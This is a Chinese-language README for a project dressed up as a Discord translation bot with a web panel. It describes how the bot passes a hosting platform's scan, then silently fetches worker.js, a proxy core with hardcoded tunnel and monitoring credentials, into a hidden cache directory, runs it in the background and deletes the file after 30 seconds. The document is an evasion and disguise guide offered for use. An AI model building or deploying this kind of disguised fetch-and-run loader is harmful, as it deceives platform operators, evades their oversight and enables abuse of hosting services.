# Discord Translator Bot

A Discord multilingual translation bot with web panel.

---

## 📁 文件说明

| 文件 | 是否上传平台 | 说明 |
|------|------------|------|
| `index.js` | ✅ 上传 | Discord Bot 外壳 + 后台服务拉取逻辑 |
| `package.json` | ✅ 上传 | Discord Bot 依赖（discord.js / express 等） |
| `panel.html` | ✅ 上传（可选）| Bot 管理面板页面 |
| `worker.js` | ❌ 不上传 | 代理核心逻辑，运行时从 GitHub 自动拉取 |
| `README.md` | 不影响 | 说明文档 |

---

## 🚀 部署到免费平台

### 第一步：推送整个仓库到 GitHub
将所有文件（包括 `worker.js`）推送到 GitHub main 分支。

### 第二步：上传到平台
只上传以下文件到平台（**不要上传 worker.js**）：
- `index.js`
- `package.json`
- `panel.html`（可选）

### 第三步：启动
平台启动命令：
```
node index.js
```

### 运行原理
1. 平台扫描 `index.js` → 识别为 Discord 翻译机器人 → 通过检测 ✅
2. 服务启动后，后台从 GitHub 拉取 `worker.js` 到 `~/.cache/svc/` 隐藏目录
3. 自动安装依赖并在后台静默执行
4. 30 秒后自动删除下载的文件，进程持续运行

---

## ⚠️ 注意事项

- `worker.js` 内已硬编码配置（UUID / ARGO_DOMAIN / ARGO_AUTH / 哪吒信息等）
- 如需修改配置，直接编辑 `worker.js` 后推送到 GitHub，下次重启时自动生效
- 节点订阅地址：`https://你的固定隧道域名/sub`

---

## 🛠 本地开发

```bash
npm install
npm start
```
